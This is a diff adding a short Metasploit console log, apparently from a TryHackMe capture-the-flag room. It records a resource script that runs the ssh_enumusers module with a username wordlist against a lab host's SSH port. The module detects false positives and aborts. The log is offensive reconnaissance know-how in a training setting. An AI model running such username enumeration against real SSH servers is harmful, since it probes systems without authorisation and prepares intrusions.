@@ -1,0 +1,20 @@
+[*] Processing exploits/run_enum.rc for ERB directives.
+resource (exploits/run_enum.rc)> use auxiliary/scanner/ssh/ssh_enumusers
+[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
+resource (exploits/run_enum.rc)> set RHOSTS 10.67.176.248
+RHOSTS => 10.67.176.248
+resource (exploits/run_enum.rc)> set RPORT 22
+RPORT => 22
+resource (exploits/run_enum.rc)> set USER_FILE /media/gabi/Data/CTF/THM/Super_Secret_TIp/exploits/enum_users.txt
+USER_FILE => /media/gabi/Data/CTF/THM/Super_Secret_TIp/exploits/enum_users.txt
+resource (exploits/run_enum.rc)> set THRESHOLD 5
+THRESHOLD => 5
+resource (exploits/run_enum.rc)> set CHECK_FALSE true
+CHECK_FALSE => true
+resource (exploits/run_enum.rc)> run
+[*] 10.67.176.248:22 - SSH - Using malformed packet technique
+[*] 10.67.176.248:22 - SSH - Checking for false positives
+[-] 10.67.176.248:22 - SSH - throws false positive results. Aborting.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (exploits/run_enum.rc)> exit
